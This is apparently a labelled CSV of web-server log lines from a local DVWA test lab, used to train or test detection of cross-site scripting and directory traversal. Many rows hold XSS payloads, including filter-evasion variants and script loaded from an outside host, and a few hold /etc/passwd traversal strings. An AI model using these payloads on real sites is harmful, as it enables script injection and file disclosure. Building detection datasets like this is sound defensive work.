,url,normal,xss,dir
18749,"127.0.0.1 - - [03/May/2021:03:11:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bernie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1732,"127.0.0.1 - - [03/May/2021:02:34:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC="" 400 0 ""-"" ""-""",0,1,0
9067,"127.0.0.1 - - [03/May/2021:03:07:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=redirect HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16831,"127.0.0.1 - - [03/May/2021:03:25:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Seang HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8909,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<p onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
4582,"127.0.0.1 - - [03/May/2021:03:07:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=pencil HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13936,"127.0.0.1 - - [03/May/2021:03:40:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
13306,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;"" 400 0 ""-"" ""-""",0,1,0
1668,"127.0.0.1 - - [03/May/2021:03:40:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<footer onclick=\""alert(1)\"">test</footer>"" 400 0 ""-"" ""-""",0,1,0
17487,"127.0.0.1 - - [03/May/2021:03:20:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lorenza HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10273,"127.0.0.1 - - [03/May/2021:03:21:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lyne HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12758,"127.0.0.1 - - [03/May/2021:03:19:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Konstanze HTTP/1.1"" 200 1702 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2263,"127.0.0.1 - - [03/May/2021:03:40:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<abbr draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
5402,"127.0.0.1 - - [03/May/2021:03:06:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=jixian HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1026,"127.0.0.1 - - [03/May/2021:03:04:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name= HTTP/1.1"" 200 1684 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4892,"127.0.0.1 - - [03/May/2021:03:19:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Karola HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6098,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<td onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
14070,"127.0.0.1 - - [28/Apr/2021:21:40:29 -0400] ""GET /favicon.ico HTTP/1.1"" 404 487 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11244,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg/onload=alert(1) HTTP/1.1"" 200 1707 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
20461,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=exp/*<A STYLE='no\\xss:noxss(\""*//*\"");"" 400 0 ""-"" ""-""",0,1,0
1161,"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<var oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
13791,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<b onmouseenter=\""alert(1)\"">test</b>"" 400 0 ""-"" ""-""",0,1,0
15096,"127.0.0.1 - - [03/May/2021:03:27:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Terza HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19522,"127.0.0.1 - - [03/May/2021:03:05:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=app HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2904,"127.0.0.1 - - [03/May/2021:03:20:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Larkin HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12516,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src"" 400 0 ""-"" ""-""",0,1,0
9472,"127.0.0.1 - - [03/May/2021:03:26:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Souphalack HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
566,"127.0.0.1 - - [03/May/2021:03:07:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=pol HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16153,"127.0.0.1 - - [03/May/2021:03:41:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ruby id=x"" 400 0 ""-"" ""-""",0,1,0
9847,"127.0.0.1 - - [03/May/2021:03:40:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe onclick=\""alert(1)\"">test</iframe>"" 400 0 ""-"" ""-""",0,1,0
5548,"127.0.0.1 - - [03/May/2021:03:24:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Renie HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18367,"127.0.0.1 - - [03/May/2021:03:21:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mari HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14862,"127.0.0.1 - - [03/May/2021:03:40:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<font id=x"" 400 0 ""-"" ""-""",0,1,0
9899,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img \\x11src=x"" 400 0 ""-"" ""-""",0,1,0
4270,"127.0.0.1 - - [03/May/2021:03:24:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Pension HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6939,"127.0.0.1 - - [03/May/2021:10:06:05 -0400] ""GET /DVWA/vulnerabilities/fi/?page=.../.../etc/passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
12135,"127.0.0.1 - - [03/May/2021:03:17:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hortense HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13104,"127.0.0.1 - - [03/May/2021:10:05:58 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
19272,"127.0.0.1 - - [03/May/2021:03:40:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
6148,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<base onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
5851,"127.0.0.1 - - [03/May/2021:03:41:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>:target {color:red;}</style><nav"" 400 0 ""-"" ""-""",0,1,0
9825,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<menu onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
6689,"127.0.0.1 - - [03/May/2021:03:08:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=zimmerman HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19494,"127.0.0.1 - - [03/May/2021:03:22:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Maudie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17602,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<nobr draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
7666,"127.0.0.1 - - [03/May/2021:02:35:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta HTTP-EQUIV=\""refresh\"""" 400 0 ""-"" ""-""",0,1,0
4920,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html"" 400 0 ""-"" ""-""",0,1,0
13183,"127.0.0.1 - - [03/May/2021:03:05:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=agent HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12104,"127.0.0.1 - - [03/May/2021:03:22:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Munaz HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17606,"127.0.0.1 - - [03/May/2021:03:17:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hestia HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12825,"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul id=x"" 400 0 ""-"" ""-""",0,1,0
3327,"127.0.0.1 - - [03/May/2021:10:05:58 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%255c..%255c..%255c..%255c..%255cetc%255cpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
1998,"127.0.0.1 - - [03/May/2021:03:05:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=andy HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4570,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<menu id=x"" 400 0 ""-"" ""-""",0,1,0
11555,"127.0.0.1 - - [03/May/2021:03:13:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Chester HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14412,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<summary id=x"" 400 0 ""-"" ""-""",0,1,0
12596,"127.0.0.1 - - [03/May/2021:03:25:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sally HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10811,"127.0.0.1 - - [03/May/2021:02:34:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\x0Djavascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
17877,"127.0.0.1 - - [03/May/2021:03:14:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Darleen HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15415,"127.0.0.1 - - [03/May/2021:03:13:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cordelia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2674,"127.0.0.1 - - [03/May/2021:03:40:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<em onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
17071,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command id=x"" 400 0 ""-"" ""-""",0,1,0
4589,"127.0.0.1 - - [03/May/2021:03:41:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<!-- IE"" 400 0 ""-"" ""-""",0,1,0
7955,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onmouseleave=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",0,1,0
8791,"127.0.0.1 - - [03/May/2021:03:05:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=deb HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10850,"127.0.0.1 - - [03/May/2021:03:07:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=pat HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7052,"127.0.0.1 - - [03/May/2021:03:26:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Steen HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15664,"127.0.0.1 - - [03/May/2021:03:07:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=paper HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8042,"127.0.0.1 - - [03/May/2021:03:40:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
14646,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=exp/*&lt;A STYLE='no\\xss&#58;noxss(\\\""*//*\\\"");"" 400 0 ""-"" ""-""",0,1,0
17367,"127.0.0.1 - - [03/May/2021:03:11:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bab HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20466,"127.0.0.1 - - [03/May/2021:03:16:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gabriela HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5401,"127.0.0.1 - - [03/May/2021:03:17:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hall HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14919,"127.0.0.1 - - [03/May/2021:03:14:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dorisa HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15791,"127.0.0.1 - - [03/May/2021:03:41:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<rp onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
8759,"127.0.0.1 - - [03/May/2021:03:18:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jagjeet HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4974,"127.0.0.1 - - [03/May/2021:03:16:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Geraldine HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
751,"127.0.0.1 - - [28/Apr/2021:21:58:58 -0400] ""GET /DVWA/index.php HTTP/1.1"" 200 2877 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8489,"127.0.0.1 - - [03/May/2021:03:14:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dorena HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10315,"127.0.0.1 - - [03/May/2021:03:18:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jacynth HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15069,"127.0.0.1 - - [03/May/2021:02:27:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchend%3dalert(1)%3e%20 HTTP/1.1"" 200 1675 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
14307,"127.0.0.1 - - [03/May/2021:02:34:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG onmouseover=\""alert('xxs')\"">"" 400 0 ""-"" ""-""",0,1,0
4242,"127.0.0.1 - - [03/May/2021:03:20:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Leese HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17708,"127.0.0.1 - - [03/May/2021:03:16:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Glory HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9535,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=x"" 400 0 ""-"" ""-""",0,1,0
16446,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<<SCRIPT>alert(\""XSS\"");//<</SCRIPT> HTTP/1.1"" 200 1715 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
889,"127.0.0.1 - - [03/May/2021:03:17:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Holly-anne HTTP/1.1"" 200 1702 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17999,"127.0.0.1 - - [03/May/2021:03:15:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Eleanora HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13761,"127.0.0.1 - - [03/May/2021:03:17:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ignatius HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9142,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<%<!--'%><script>alert(1);</script -->"" 400 0 ""-"" ""-""",0,1,0
9745,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT>document.write(\""<SCRI\"");</SCRIPT>PT SRC=\""http://ha.ckers.org/xss.js\""></SCRIPT>"" 400 0 ""-"" ""-""",0,1,0
8488,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<kbd onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
13651,"127.0.0.1 - - [03/May/2021:03:41:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<br> HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
12186,"127.0.0.1 - - [03/May/2021:03:27:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Thedora HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10007,"127.0.0.1 - - [03/May/2021:03:40:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<menuitem onmouseenter=\""alert(1)\"">test</menuitem>"" 400 0 ""-"" ""-""",0,1,0
2454,"127.0.0.1 - - [03/May/2021:03:40:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<html onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
18524,"127.0.0.1 - - [03/May/2021:03:12:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Briana HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
712,"127.0.0.1 - - [03/May/2021:03:24:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rakel HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1316,"127.0.0.1 - - [03/May/2021:02:34:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<head><base href=\""javascript://\""></head><body><a"" 400 0 ""-"" ""-""",0,1,0
10240,"127.0.0.1 - - [03/May/2021:03:40:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
